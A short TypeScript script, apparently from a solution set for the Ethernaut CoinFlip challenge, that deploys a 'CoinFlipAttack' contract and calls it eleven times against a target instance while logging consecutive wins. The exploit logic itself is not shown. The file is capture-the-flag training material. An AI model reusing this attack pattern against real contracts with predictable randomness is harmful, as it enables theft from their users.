import { CoinFlip, CoinFlipAttack } from '../../typechain-types';
import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const COIN_FLIP_LEVEL_NAME = "CoinFlip"

export const coinFlipAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {
            console.log('Deploying CoinFlipAttacker');
            const attackerContract = await ethereum.deployContract<CoinFlipAttack>('CoinFlipAttack');
            console.log('Deployed CoinFlipAttacker at: ', await attackerContract.getAddress());

            for (let i = 0; i <= 10; i++) {
                console.log('Flipping... ');
                const attackTx = await attackerContract.attack(instanceAddress);
                await attackTx.wait();
                const currentWins = await (await ethereum.getContract<CoinFlip>('CoinFlip', instanceAddress)).consecutiveWins();
                console.log('Current wins: ', currentWins);
            }
        }
    }
}